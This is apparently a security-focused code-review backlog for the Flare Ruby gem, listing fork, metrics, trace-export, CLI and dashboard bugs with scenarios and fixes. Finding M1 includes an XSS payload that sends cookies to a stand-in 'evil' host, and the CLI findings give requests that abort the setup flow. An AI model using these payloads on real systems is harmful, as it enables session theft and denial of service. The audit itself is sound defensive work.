# Flare Gem — Code Review Backlog (2026-07-08)

Findings from a security- and correctness-focused review of the Flare gem, covering the
dashboard/storage layer, the metrics pipeline, the trace-export/HTTP path, and the
CLI/config/engine setup. Each item was verified by reading the source. Line numbers
reference the state of the tree at review time.

## How to read severity

Severity is calibrated against Flare's environment model (see `CLAUDE.md`):

- **Dashboard + spans (SQLite): development/test only.** Dashboard issues cannot reach
  production unless the dev server is bound to a non-loopback address or the engine is
  mounted manually. Severity is discounted accordingly but the bugs are still real.
- **Metrics pipeline: every environment except test, including production.** Bugs here
  hit production directly.
- **Sampled tracing (TraceExporter / RuleManager / UploadUrlPool / FilteringSpanProcessor):
  a production feature.** Bugs here degrade or silently disable tracing in production,
  usually in forked web workers.

Ranking is by real-world blast radius, most severe first.

---

## HIGH

### H1 — Forked workers re-submit the parent's pre-fork metrics (duplicate data)

- **File:** `lib/flare/metric_flusher.rb:57,66-70,97-100`; trigger `lib/flare/metric_span_processor.rb:75-81`
- **What:** `after_fork` → `restart` → `stop`, and `stop` performs "one last drain" that
  *submits* whatever is in `@storage`. After a fork the child's `MetricStorage` is a
  copy-on-write duplicate of the parent's, so the child submits metrics the parent will
  also submit. concurrent-ruby resets its inherited thread pool on fork, so the child's
  submission actually goes out.
- **Scenario:** Puma cluster with `preload_app!` (metrics are ON in production). Master
  boots, accumulates initializer-time spans, then forks N workers. Each worker's first
  span end fires `detect_forking` → `Flare.after_fork` → `MetricFlusher#restart` → `stop`
  → drains the inherited storage and submits it. The master's timer submits the same data.
  Boot-window metrics are counted N+1 times server-side.
- **Fix:** In `after_fork`, discard inherited data instead of submitting it — drain-and-drop,
  or add a `restart(submit_pending: false)` path that skips the final drain. Only the
  process that owned the data pre-fork should submit it.

### H2 — Orphaned delayed-trace entry makes the trace-export worker busy-spin at 100% CPU

- **File:** `lib/flare/filtering_span_processor.rb:163-172,179-186,192-197,199-223`
- **What:** `mark_trace_ready` early-returns (`return unless batch`, line 165) *before*
  deleting the trace from `@delayed_ready_by_trace` (line 168). If a trace listed in the
  delayed map has all its pending spans evicted by `evict_oldest_spans` (which never touches
  the delayed map), the delayed entry is never removed. `promote_due_delayed_traces` re-selects
  it every tick, `next_wait_timeout` returns `0`, and `worker_loop` spins `wait(mutex, 0)` →
  no-op → repeat, pegging a core.
- **Scenario:** Queue exceeds `max_queue` (5,000) under load. A marked trace's owner span is
  enqueued with a grace delay; `evict_oldest_spans` evicts that trace's spans because it is
  oldest, while it remains registered in the delayed map. One grace period later the entry is
  due, has no batch, and is re-selected forever. Only `force_flush`/`shutdown` clears it.
- **Fix:** In `promote_due_delayed_traces`, delete the `@delayed_ready_by_trace` entry
  unconditionally before calling `mark_trace_ready`, and/or have `evict_oldest_spans` remove
  the trace from `@delayed_ready_by_trace` when it deletes it from `@pending_by_trace`.

### H3 — RuleManager keeps the parent's ETag across fork → tracing silently dies in workers

- **File:** `lib/flare/rule_manager.rb:77-82,104-110,121-129`
- **What:** `after_fork` clears the URL pool (`@pool.after_fork`) but does not reset `@etag`.
  The child's first poll sends `If-None-Match` with the parent's ETag; if rules are unchanged
  the server returns 304, and the 304 branch deliberately does not refill the pool
  (`when "304" then @marker.sweep`). The child's pool stays empty.
- **Scenario:** Production Puma worker forks; rules are stable (the steady state). Child polls
  → 304 → pool never refills → `UploadUrlPool#checkout` returns nil for every batch → all
  sampled traces dropped in every forked worker, silently (only the `upload_url_pool_empty`
  health counter moves).
- **Fix:** Set `@etag = nil` in `after_fork` so the child's first poll is unconditional.

### H4 — One bad trace aborts the whole export batch and leaks a presigned URL

- **File:** `lib/flare/trace_exporter.rb:60-74,86-108`
- **What:** `export` loops traces calling `ship`, but only `notify` has its own rescue.
  `ship` checks out a pool URL (line 89) and *then* runs `gzip(JSON.generate(blob.to_h))`
  (95) and `@transport.put` (96). Any exception from those — a serialization error (see H5),
  a malformed URL, or a transport error (`Net::ReadTimeout`, `Errno::ECONNRESET`,
  `OpenSSL::SSL::SSLError`) — propagates to `export`'s `rescue`, which returns FAILURE and
  **skips all remaining traces in the batch**. The checked-out URL is consumed but never used,
  draining the pool.
- **Scenario:** A 5s read timeout to R2 (a normal transient event) throws `Net::ReadTimeout`;
  the remaining N-1 traces in the batch are never attempted, the URL is gone, and
  `put_failure_count` is not even incremented (only `exception_count`).
- **Fix:** Build/serialize the body *before* checkout; wrap the transport call (or the whole
  per-trace `ship`) in `begin/rescue`, count it as a put failure, and continue to the next
  trace. Optionally treat transport exceptions like a 403 (retry once with the next URL).

### H5 — Invalid UTF-8 in span attributes crashes JSON serialization in both exporters

- **File:** `lib/flare/trace_blob.rb:97` + `lib/flare/trace_exporter.rb:95`;
  `lib/flare/sqlite_exporter.rb:149`
- **What:** Span attributes are attacker-influenced: `url.path`/`http.target` come from the
  raw request line and `db.statement` is verbatim SQL (`lib/flare.rb:369`), which can contain
  binary literals or invalid UTF-8. `JSON.generate` raises `JSON::GeneratorError` on such
  strings. In `TraceExporter` this triggers H5's blast radius (whole batch dropped + URL
  leaked). In `SQLiteExporter` the raise is caught by the outer `rescue` at line 58 and the
  **entire BatchSpanProcessor flush** returns FAILURE — one request with a weird byte in its
  path blanks out everything else in that flush interval.
- **Scenario:** `curl 'http://localhost:3000/%ff'`, or an app that stores binary in a string
  column and it appears in logged SQL. Every export batch containing that span fails; in
  production sampled-tracing mode, traces silently stop flowing.
- **Fix:** Scrub string attribute values before serialization
  (`value.encode("UTF-8", invalid: :replace, undef: :replace)` plus `String#scrub`) in
  `TraceBlob#span_to_h` and `SQLiteExporter#create_properties`. In `SQLiteExporter`, rescue
  per-attribute so one bad value cannot kill the batch.

### H6 — CLI auth flow aborts on the first bogus `/callback` request (setup DoS)

- **File:** `lib/flare/cli/setup_command.rb:155-199`
- **What:** `wait_for_callback` terminates the whole flow on the *first* callback that has an
  `error` param, a mismatched `state`, or a missing `code` — instead of ignoring it and
  continuing to wait. The `error` branch (line 179) runs *before* state validation, so no
  `state` guess is needed.
- **Scenario:** During the up-to-5-minute authorization window, any local process — or any
  web page the user has open, via a drive-by `fetch("http://127.0.0.1:PORT/callback?error=x")`
  (simple GET, no CORS preflight; loopback ports are cheaply scannable from JS) — makes one
  request and setup aborts. It cannot steal the code (attacker cannot produce valid `state`,
  and the code is useless without `code_verifier`), but it reliably denies setup.
- **Fix:** On `error` (honor it only when `state` matches), state mismatch, or missing code:
  respond with the error page, close the client, and `next` to keep waiting until the deadline.
  Only `return` for a state-valid callback carrying a code.

### H7 — OpenTelemetry dependencies are completely unpinned, and code requires an internal OTel path

- **File:** `flare.gemspec:34-40`; `lib/flare.rb:182`
- **What:** All seven `opentelemetry-*` dependencies have no version constraints — no lower
  bound (bundler may resolve an old version missing APIs like `span_naming: :job_class` or
  `untraced_requests`) and no upper bound (a future OTel SDK 2.0 breaking release is picked up
  automatically). Compounding this, `lib/flare.rb:182` requires the non-public internal path
  `"opentelemetry/instrumentation/active_support/span_subscriber"`, which OTel can rename in
  any minor release — turning boot into a `LoadError` for every Flare user.
- **Scenario:** A routine `bundle update` in a user's app pulls an incompatible OTel version;
  Flare fails to load or behaves incorrectly, and the user has no signal that Flare pinned
  nothing.
- **Fix:** Add pessimistic constraints matching tested versions
  (e.g. `spec.add_dependency "opentelemetry-sdk", "~> 1.4"`), and wrap the internal require in
  a rescued `require` with a clear error if the path moves.

---

## MEDIUM

### M1 — `</script>` breakout XSS in the request detail view

- **File:** `app/views/flare/requests/show.html.erb:294-311`
- **What:** `@request[:name]`, `span[:name]`, and every value in `span[:properties]` (SQL,
  URLs, cache keys, HTTP targets — all attacker-influenced) are serialized with
  `.to_json.html_safe` and embedded directly inside a `<script>` block. Ruby's `to_json` does
  not escape `<`, `>`, or `/`, so any attribute containing the literal `</script>` breaks out
  of the script context.
- **Scenario:** Attacker sends `GET /</script><script>fetch('//evil/'+document.cookie)</script>`
  (or embeds the payload in a header/param/custom `app.*` instrumentation value) to the dev
  server. The span is stored. When the developer opens that request's detail page, the injected
  markup executes in the dev app's origin — reading session/CSRF tokens or issuing authenticated
  requests. Dev-only, hence Medium not High, but genuinely exploitable.
- **Fix:** Escape HTML-significant characters for `<script>` context, e.g.
  `raw json_escape({...}.to_json)` (`json_escape` converts `<`/`>`/`&` to `<` etc.), or
  emit into a `<script type="application/json">` tag and `JSON.parse` it.

### M2 — UploadUrlPool starves on the 304/ETag path (steady state)

- **File:** `lib/flare/upload_url_pool.rb:32-53`; `lib/flare/rule_manager.rb:104-118`
- **What:** `checkout` permanently removes entries; the only refill is `RuleManager#apply` →
  `@pool.replace`, which runs **only on a 200**. On 304 the pool is untouched. If the server
  computes its ETag over the rules alone, a steady-state app whose rules never change gets 304s
  forever while every exported trace consumes a URL — the pool drains to empty and all
  subsequent traces drop. (Conversely, if fresh URLs are always in the body, the ETag never
  matches and `If-None-Match` is dead code — one of the two mechanisms is broken.) This is the
  non-fork sibling of H3.
- **Fix:** Drop `If-None-Match` (or send it only when the pool is comfortably full), or re-poll
  without the ETag once pool `size` falls below a low-water mark. Verify flare-web's ETag
  semantics.

### M3 — SQLite connections can be inherited across fork (possible DB corruption)

- **File:** `lib/flare/sqlite_exporter.rb:261-277`; `lib/flare/storage/sqlite.rb:690-705`
- **What:** Connections are cached in `Thread.current` and closed only once, at the end of
  `setup_database`. `@setup` stays true afterward and the main thread reopens on the next
  export/query. A later fork (Spring, Puma cluster with dev preload, app-level `fork`) makes
  the child inherit the parent's *open* `SQLite3::Database` handle and fd. `Flare.after_fork`
  only restarts the flusher and rule manager — it never closes SQLite handles. SQLite documents
  that carrying an open connection across `fork()` can corrupt the database.
- **Fix:** Store the owning pid alongside the cached connection and reopen when `$$` changes
  (the pattern `FilteringSpanProcessor#detect_forking` already uses), and/or close storage and
  exporter connections in `Flare.after_fork`.

### M4 — `prune` is non-atomic across 8 statements → orphaned rows + wrongly-stripped spans

- **File:** `lib/flare/storage/sqlite.rb:541-605`
- **What:** `prune` issues eight independent `execute` calls, each its own implicit transaction
  (the mutex is per-process only). The `max_spans` phase deletes properties, event-properties,
  events, then spans, each re-evaluating the newest-N window. Between statements another writer
  (web + jobs both write in dev; two Puma workers) inserts spans and shifts the window: a span
  whose properties were deleted can fall back inside the window and survive stripped of its
  properties, while `flare_properties` for already-deleted spans is never cleaned and grows
  unbounded.
- **Fix:** Wrap the whole prune in a single `connection.transaction`, or delete orphans by
  anti-join *after* deleting spans
  (`DELETE FROM flare_properties WHERE owner_id NOT IN (SELECT id FROM flare_spans)`), which is
  self-healing.

### M5 — SourceLocation captures the backtrace twice per query, in every environment

- **File:** `lib/flare/source_location.rb:28-67`; `lib/flare.rb:373`
- **What:** `add_to_attributes` calls `find` (`caller(2, 50)`) then `find_trace`
  (`caller(2, 100)`), materializing and regex-scanning up to 150 formatted frame strings per
  invocation. It is wired into the `sql.active_record` transformer, which runs for every query
  in all environments, including production where it feeds metrics and `code.filepath` is not
  even used. On a query-heavy endpoint this is a measurable per-request tax. Correctness wrinkle:
  `IGNORE_PATTERNS` includes bare `/flare/`, so a user app at e.g.
  `/home/deploy/flareapp/...` matches and never gets source locations.
- **Fix:** Capture the backtrace once via `caller_locations(2, 100)` (`Location` objects avoid
  string formatting) and derive both results from it; skip entirely when spans are not being
  recorded (production metrics path). Anchor the flare ignore pattern to gem paths
  (`%r{/gems/flare[-/]}`).

### M6 — Metrics permanently dropped on submission failure; retry list misses common transient errors

- **File:** `lib/flare/metric_flusher.rb:104-125`; `lib/flare/metric_submitter.rb:161-185`
- **What:** `post_to_pool` drains storage *before* knowing the outcome and never re-queues on
  failure. `retry_with_backoff` retries only `SubmissionError, Net::OpenTimeout,
  Net::ReadTimeout, Errno::ECONNREFUSED, Errno::ECONNRESET`. `SocketError` (DNS blip),
  `OpenSSL::SSL::SSLError`, `Net::WriteTimeout`, `Errno::EPIPE`, `Errno::EHOSTUNREACH` fall into
  the generic non-retriable branch. `MetricStorage#add` exists to support re-merging but has no
  caller — the requeue was never wired up.
- **Scenario:** A short flare.am outage or a DNS hiccup erases 1–2 buckets of production metrics
  per process.
- **Fix:** On terminal failure, re-merge the drained hash back into storage via
  `storage.add(key, **values)` (with a cap), and broaden the retriable exception list
  (`SystemCallError, IOError, OpenSSL::SSL::SSLError, Timeout::Error`).

### M7 — `after_fork` detection is a non-atomic check-then-act → leaked duplicate flusher timer

- **File:** `lib/flare/metric_span_processor.rb:75-81`; `lib/flare/metric_flusher.rb:28-70`
- **What:** `detect_forking` does `if @pid != $$ … @pid = $$; Flare.after_fork` with no
  synchronization. In a freshly forked worker, multiple request threads finishing spans can all
  observe the stale pid and each call `Flare.after_fork`. `MetricFlusher#start/stop/restart` are
  also unsynchronized: two concurrent `start`s each assign `@timer`/`@pool`; the first `TimerTask`
  is overwritten and never shut down, leaving a leaked timer that drains and submits on its own
  interval (compounding H1). `FilteringSpanProcessor#detect_forking` does this correctly with a
  mutex + double-check.
- **Fix:** Guard the pid check with a mutex + re-check (mirror `FilteringSpanProcessor`), and make
  `MetricFlusher#start/stop/restart` idempotent under a lock.

### M8 — Lost metric increments in the drain/increment race

- **File:** `lib/flare/metric_storage.rb:14-17,26-33`
- **What:** `increment` is `compute_if_absent(key)` then `counter.increment` — two steps. `drain`
  does `delete(key)` then `counter.to_h`. If a request thread obtains the counter, the flusher
  then deletes the key and snapshots, and the request thread's `increment` lands afterward, that
  event is applied to an orphaned counter and never submitted. The three separate atomic reads in
  `to_h` can also ship a `count`/`sum_ms` pair off by one event.
- **Fix:** Either accept-and-document (Flipper-style), or close the window: swap in a fresh
  `Concurrent::Map` on drain and re-merge late writers via the (currently unused) `add`, or make
  `increment` retry via `compute_if_absent` when it detects a drained counter.

### M9 — `.env` written world-readable; token interpolated unsafely into `gsub`

- **File:** `lib/flare/cli/setup_command.rb:269-291`
- **What:** `File.write(env_path, …)` creates `.env` with umask defaults (typically 0644) — the
  API secret is world-readable on shared machines. And the token is interpolated into
  `contents.gsub!(/^FLARE_KEY=.*$/, "FLARE_KEY=#{token}")`; `gsub` interprets backreferences
  (`\0`, `\1`, `\\`) in the replacement, so a token with backslash sequences is silently
  corrupted, and a token containing a newline injects extra lines into `.env`. The token comes
  from the `FLARE_HOST`-controlled server response.
- **Fix:** Validate the token (`/\A[A-Za-z0-9._-]+\z/`) after exchange; use the block form
  `gsub!(/^FLARE_KEY=.*$/) { "FLARE_KEY=#{token}" }`; write with `perm: 0o600`.

### M10 — `flare.defaults` initializer can crash app boot on credentials errors

- **File:** `lib/flare/engine.rb:8-10`
- **What:** `ENV["FLARE_KEY"] ||= app.credentials.dig(:flare, :key)`. If credentials can't be
  decrypted (missing/wrong `RAILS_MASTER_KEY`, corrupt `credentials.yml.enc`), `dig` raises
  `ActiveSupport::MessageEncryptor::InvalidMessage` — unrescued, so installing Flare makes apps
  that otherwise never touch credentials fail to boot. `Configuration#credentials_url`
  (`configuration.rb:120-125`) already rescues `StandardError` for exactly this case, so the
  engine is inconsistent with the gem's own pattern. Also, a non-string credential value
  (`flare: { key: 12345 }`) raises `TypeError` on assignment to `ENV`.
- **Fix:** `ENV["FLARE_KEY"] ||= (app.credentials.dig(:flare, :key)&.to_s rescue nil)`.

### M11 — CLI hangs forever on a silent client connection (no per-client read timeout)

- **File:** `lib/flare/cli/setup_command.rb:162-172`
- **What:** After `server.accept`, `client.gets` blocks indefinitely. The 5-minute deadline is
  only checked between accepts, so nothing bounds a single read. A process (port scanner, browser
  speculative preconnect, malware) that connects and sends nothing hangs the single-threaded loop
  past the timeout, and the real callback is never serviced.
- **Fix:** Wrap the per-client read in `Timeout.timeout(2)` (or `IO.select` with a short deadline);
  `ensure client.close`; cap header lines read.

### M12 — Malformed callback path crashes setup with an uncaught `URI::InvalidURIError`

- **File:** `lib/flare/cli/setup_command.rb:201-208`
- **What:** `parse_query_string` calls `URI(path)` on attacker-controlled bytes; characters like
  `|`, `{`, `^`, or a backslash raise `URI::InvalidURIError`, unrescued anywhere in the flow. A
  single `curl "http://127.0.0.1:PORT/callback?a=b|c"` (or a scanner sending odd targets) crashes
  the CLI mid-auth with a backtrace. Another one-request kill, compounding H6.
- **Fix:** Rescue `URI::InvalidURIError`/`ArgumentError` in `parse_query_string` and return `{}`
  (which, with H6 fixed, is ignored and the loop continues).

---

## LOW

### L1 — No authentication on the dashboard; only route-level environment gating

- **File:** `lib/flare/engine.rb:36-43`; `app/controllers/flare/application_controller.rb`
- **What:** The mount is correctly gated to development/test, but there is no auth on any action
  and no runtime environment re-check inside the controllers. `rails server -b 0.0.0.0` (common
  for Docker/LAN) exposes all captured spans — SQL literals, params, headers, stacktraces — to
  the whole network. A manual mount in the user's `routes.rb` would also land unauthenticated.
- **Fix:** Add a runtime `before_action` in `ApplicationController` returning 403 unless
  `Rails.env.development? || Rails.env.test?` (defense-in-depth), and/or a configurable auth hook.
  Document the `-b 0.0.0.0` exposure.

### L2 — Rack ignore rule swallows any app path starting with `/flare`

- **File:** `lib/flare.rb:207-211`
- **What:** `return true if request.path.start_with?("/flare")` untraces not just the dashboard but
  any user route like `/flares`, `/flare-ups`, `/flareon` — those requests silently vanish from
  spans and metrics in every environment (including production metrics).
- **Fix:** `path == "/flare" || path.start_with?("/flare/") || path.start_with?("/flare-assets/")`.

### L3 — Static-asset middleware is inserted in production

- **File:** `lib/flare/engine.rb:13-20`
- **What:** `flare.static_assets` has no environment guard, so `Rack::Static` for `/flare-assets`
  is added to the production middleware stack even though the dashboard only mounts in dev/test.
  Exposure is limited to the gem's own JS/CSS, but it is dead middleware on every production
  request and fingerprints the gem's presence/version.
- **Fix:** Guard with the same `Rails.env.development? || Rails.env.test?` condition.

### L4 — Configuration snapshots `ENV["FLARE_KEY"]` at construction (order-sensitive)

- **File:** `lib/flare/configuration.rb:67-68`
- **What:** `@key = ENV["FLARE_KEY"]` is read when `Configuration.new` first runs. The engine
  copies the key from credentials into ENV in `flare.defaults`, but if `Flare.configuration` is
  touched earlier (e.g. `Flare.configure` in `config/application.rb`, or a require-time call),
  `@key` is captured as `nil` and never refreshed — metrics/tracing submission silently disable
  with only a debug log. Same snapshot applies to `@url`.
- **Fix:** Read lazily (`def key; @key || ENV["FLARE_KEY"]; end`) or re-resolve in
  `start_metrics_flusher`.

### L5 — PKCE authorize URL omits `code_challenge_method=S256`

- **File:** `lib/flare/cli/setup_command.rb:132`
- **What:** The PKCE math is correct S256, but the URL omits `code_challenge_method`. Per RFC 7636
  §4.3 an absent method defaults to `plain`; this works only if flare-web hardcodes S256. If the
  server ever follows the spec default or accepts both, this breaks the exchange or enables a
  plain-method downgrade.
- **Fix:** Append `&code_challenge_method=S256`.

### L6 — State comparison is not constant-time

- **File:** `lib/flare/cli/setup_command.rb:183`
- **What:** `returned_state != expected_state` is an early-exit comparison. Exploitability over
  loopback against a 256-bit value is very low, but the fix is one line.
- **Fix:** `Rack::Utils.secure_compare` / `OpenSSL.fixed_length_secure_compare`.

### L7 — `flare setup` infinite-loops on closed/EOF stdin

- **File:** `lib/flare/cli/setup_command.rb:245-267`
- **What:** On invalid input `save_token` recurses; at EOF `$stdin.gets` returns `nil` forever, so
  a non-interactive run (CI, piped stdin) spins printing "Invalid choice." and eventually hits
  `SystemStackError`.
- **Fix:** Treat `nil` from `gets` as abort (print token + exit); convert recursion to a bounded
  loop.

### L8 — `--force` silently overwrites a customized initializer

- **File:** `lib/flare/cli/setup_command.rb:330-348`; `lib/flare/cli.rb:21-22`
- **What:** One `--force` flag both re-runs auth and overwrites `config/initializers/flare.rb`. A
  user re-authenticating after key rotation loses hand-edited config (ignore patterns,
  http_metrics) with no confirmation — it only prints "Overwrote" after the fact.
- **Fix:** Prompt before overwriting an existing initializer, or split `--force-auth` vs
  `--force-init`.

### L9 — `created_at` stored as local-time ISO8601 → ordering/pruning breaks across offset changes

- **File:** `lib/flare/sqlite_exporter.rb:89`; `lib/flare/storage/sqlite.rb:542`
- **What:** Timestamps are written with the machine's local offset. All `ORDER BY created_at` and
  `created_at < ?` are string comparisons, chronologically correct only when the offset is
  constant. Around a DST fall-back (or a TZ change) ordering and the retention cutoff are wrong
  for the overlapping hour — spans pruned early or retained past cutoff, list ordering jumbled.
- **Fix:** Store `Time.now.utc.iso8601(6)` in both the exporter and the prune cutoff.

### L10 — `TraceBlob#duration_ms` integer-truncates sub-millisecond spans to 0

- **File:** `lib/flare/trace_blob.rb:113`
- **What:** `((end - start) / 1_000_000).to_i` is integer division on nanoseconds, so every
  sub-millisecond span (most SQL/cache spans) reports `0ms`.
- **Fix:** Use float division and round, or report microseconds.

### L11 — `UploadUrlPool#sweep`/`replace` use `set`, racing `checkout`'s CAS (latent)

- **File:** `lib/flare/upload_url_pool.rb:69-77`
- **What:** `checkout` uses `compare_and_set`, but `sweep` does read → filter → `set`. A checkout
  landing between the read and set puts the checked-out entry back, so the same presigned URL is
  used for two blobs and one PUT overwrites the other. Latent — nothing calls `pool.sweep` today —
  but the comment invites `RuleManager` to call it.
- **Fix:** Make `sweep` a CAS loop like `checkout`.

### L12 — BackoffPolicy shared mutable state across threads; latent infinite loop; biased jitter

- **File:** `lib/flare/backoff_policy.rb:41-55`; `lib/flare/metric_submitter.rb:72-73,161-185`
- **What:** One `MetricSubmitter` (and its single `BackoffPolicy`) is shared between the pool
  worker and `flush_now` callers; concurrent `submit`s interleave `reset`/`@attempts += 1`,
  producing wrong intervals. In `retry_with_backoff`, if the block ever returned
  `should_retry = true` instead of raising, the loop repeats without decrementing
  `attempts_remaining` (unreachable today, but a booby trap). `add_jitter` couples direction and
  magnitude to one `rand`, biasing intervals ~+12.5% (cosmetic, inherited from Flipper).
- **Fix:** Per-call backoff instance (or mutex); decrement attempts in the `should_retry` branch.

### L13 — Metric flusher pool overflow silently discards drained batches

- **File:** `lib/flare/metric_flusher.rb:31-35,113`
- **What:** `FixedThreadPool(1, max_queue: 20, fallback_policy: :discard)`. If the single worker
  is stuck in backoff sleeps and 20 batches queue, `@pool.post` silently discards
  already-drained metrics. Compounds M6.
- **Fix:** Check `post`'s return value and re-add on `false` (folds into M6's re-merge).

### L14 — No fork recovery for RuleManager when metrics are off but tracing is on

- **File:** `lib/flare.rb:161-164`
- **What:** `Flare.after_fork` is only triggered by `MetricSpanProcessor#detect_forking`, installed
  only when `metrics_enabled`. With metrics off and tracing on, nothing restarts the `RuleManager`
  timer or clears the pool in a forked child — rules freeze at fork-time values and the child
  exhausts the parent's presigned URLs, after which tracing dies silently.
- **Fix:** Give `FilteringSpanProcessor#detect_forking` (or a shared fork watcher) responsibility
  for calling `Flare.after_fork`, mirroring the metrics path.

### L15 — Late-arriving sampled-trace spans are buffered indefinitely

- **File:** `lib/flare/filtering_span_processor.rb:62-78,106-121,238-253`
- **What:** `complete:` is true only for root/entry spans. A child span whose `on_finish` arrives
  *after* the root promoted the trace re-creates `@pending_by_trace[trace_id]` with
  `complete: false`, and nothing promotes it again. Such spans sit until queue-overflow eviction or
  shutdown (exported possibly hours stale). Memory is bounded by `max_queue` but capacity is
  permanently consumed.
- **Fix:** Treat a span as complete when its trace was already promoted (track recently-promoted
  trace ids), or age out pending traces on the worker's flush tick.

### L16 — No top-level rescue in `on_finish` → an extraction bug can crash host request threads

- **File:** `lib/flare/metric_span_processor.rb`; `lib/flare/filtering_span_processor.rb` (`on_finish`)
- **What:** Neither processor's `on_finish` has a top-level rescue, and the OTel SDK invokes
  processors without one. Any future bug in metric extraction (nil handling, parsing) would raise
  directly into the host app's request thread rather than being contained to Flare.
- **Fix:** Wrap `on_finish` bodies in a blanket `rescue` + an error counter (as `drain_and_export`
  already does). Cheap insurance.

---

## Verified clean

Recorded so a future reviewer need not re-check:

- **SQL injection.** Every user/attribute-derived value in `Storage::SQLite` and `SQLiteExporter`
  is bound via `?` placeholders; the only string interpolations into SQL are frozen constants
  (`MISSING_PARENT_ID`, placeholder lists). Dashboard params (`name`, `status`, `method`, `origin`,
  `id`, `offset`) are bound or matched against whitelists. No injection paths.
- **Static-asset path traversal.** `/flare-assets` is served by `Rack::Static` rooted at the
  engine's `public/`; traversal normalization is Rack's, no user path is interpolated.
- **Dashboard `clear` (DELETE).** CSRF-protected via `protect_from_forgery with: :exception` and a
  DELETE verb + `button_to`.
- **TLS / secret hygiene.** `HttpTransport` and `MetricSubmitter` use Net::HTTP default
  `VERIFY_PEER` with `use_ssl`; open/read/write timeouts are set on every request. `FLARE_KEY`
  appears only in `Authorization` headers; presigned URLs are never logged. `ClientHeaders` is
  correctly withheld from the R2 PUT.
- **Browser open in CLI.** `system("open", url)` is multi-arg — no shell interpolation even with a
  hostile `FLARE_HOST`. The callback `error` text is HTML-escaped before rendering. The TCP server
  binds `127.0.0.1` on an ephemeral port and is closed in an `ensure`.
- **Environment defaults.** Spans are development-only; metrics/tracing are off in test;
  Rails-env checks are rescue-guarded and default to off. Spans cannot accidentally enable in
  production.
- **PKCE core math.** 43-char `SecureRandom.urlsafe_base64(32)` verifier; challenge = unpadded
  base64url SHA-256 (proper S256). (See L5 for the missing `code_challenge_method` param.)
- **Sampler, MetricKey, MetricCounter, Marker, WebMarkerSubscriber, metric bucketing.** Atomic rule
  swaps, correct value semantics (`eql?`/`hash`), `trace_id_ratio` math, UTC-minute bucketing, and
  cache/SQL/status classification all verified correct. The only wrinkle (non-atomic counter
  `to_h`) is M8.
- **UploadUrlPool `checkout` CAS loop and expiry math**, and **TraceHealthReporter** delta
  accounting.

---

## Suggested order of attack

1. **H1, H2, H3** — production fork/CPU bugs that silently corrupt data or peg a core; highest
   real impact.
2. **H4 + H5** — trace-export batch abort and the UTF-8 crash that triggers it; fix together.
3. **H7** — pin OTel deps and harden the internal require before the next upstream release breaks
   users.
4. **H6, M11, M12** — the three CLI auth-flow robustness bugs; small, self-contained, fix together.
5. **M1** — the dashboard XSS; small view change.
6. Remaining Medium items (M2–M10), then Low as capacity allows.
